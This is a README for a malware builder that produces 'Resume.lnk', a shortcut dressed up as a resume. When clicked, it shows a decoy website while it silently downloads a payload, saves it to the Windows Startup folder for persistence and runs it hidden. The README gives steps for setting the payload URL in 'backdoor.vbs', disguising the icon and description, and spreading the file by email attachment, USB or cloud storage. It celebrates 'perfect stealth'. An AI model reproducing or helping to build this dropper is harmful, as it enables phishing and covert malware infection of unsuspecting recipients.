# 🚀 Portable Resume.lnk Generator

## 📁 Files (Only 4!)

| File | Purpose |
|------|---------|
| **MAKE_RESUME_LNK.bat** | 🎯 **RUN THIS** to generate Resume.lnk |
| **backdoor.vbs** | ⚙️ Edit URLs/settings here |
| **CREATE_PORTABLE_LNK.ps1** | 🔧 Generator script (auto-called) |
| **Resume.lnk** | ✅ **DEPLOY THIS** - your portable file! |

---

## 🎯 Quick Start

### Step 1: Customize
Edit `backdoor.vbs` and set your URLs:
```vbscript
decoyURL = "https://your-website.com"      ' Decoy website
downloadURL = "https://your-server.com/payload.exe"  ' Your payload
startupFilename = "YourApp.exe"            ' Filename for Startup
```

### Step 2: Generate
Double-click `MAKE_RESUME_LNK.bat`

### Step 3: Deploy
Copy `Resume.lnk` to:
- USB drive
- Email attachment
- Cloud storage
- Anywhere!

### Step 4: Done!
`Resume.lnk` works on **ANY Windows PC** - no dependencies!

---

## ✨ Features

✅ **Truly Portable** - No hardcoded paths  
✅ **Single File** - Deploy only Resume.lnk  
✅ **Embedded Logic** - All code inside .lnk  
✅ **No Dependencies** - Works anywhere  
✅ **Perfect Stealth** - Completely invisible  
✅ **Auto-Persistence** - Saves to Startup folder  
✅ **Smart Execution** - Checks if already running  

---

## 🔒 What Happens When User Clicks Resume.lnk?

1. **Opens decoy website** (visible - perfect cover!)
2. **Downloads payload** (invisible)
3. **Saves to Startup folder** (persistent)
4. **Validates PE header** (security check)
5. **Executes payload** (hidden)
6. **Auto-runs after reboot** (from Startup)

---

## 📦 Distribution

**To distribute, you only need:**
- `Resume.lnk` (that's it!)

**For development/customization, you need:**
- All 4 files in this folder

---

## 🛠️ Technical Details

- **Method**: lnk2vbs technique
- **Embedding**: VBScript directly in .lnk file
- **Extraction**: Uses `cmd.exe` + `findstr`
- **Execution**: Temporary VBS in %TEMP%
- **Cleanup**: Auto-deletes temp file
- **Visibility**: Window style 0 (invisible)

---

## 🎨 Customization

### Change Icon
Edit `MAKE_RESUME_LNK.bat`:
```batch
set "LNK_ICON=%%SystemRoot%%\System32\shell32.dll,4"
```
[Shell32 icon reference](https://www.howtogeek.com/107845/how-to-change-the-icon-for-any-program-in-windows/)

### Change Description
Edit `MAKE_RESUME_LNK.bat`:
```batch
set "LNK_DESCRIPTION=Professional Resume"
```

### Change Filename
Edit `MAKE_RESUME_LNK.bat`:
```batch
set "LNK_NAME=Resume.lnk"
```

---

## ⚠️ Notes

- Brief CMD window may flash (normal for lnk2vbs technique)
- Requires internet connection to download payload
- Payload must be valid PE file (.exe)
- Windows Defender may flag downloaded executables

---

## 🎓 Credits

Built using the lnk2vbs embedding technique for maximum portability!

---

**🌟 Enjoy your portable, stealthy Resume.lnk! 🌟**

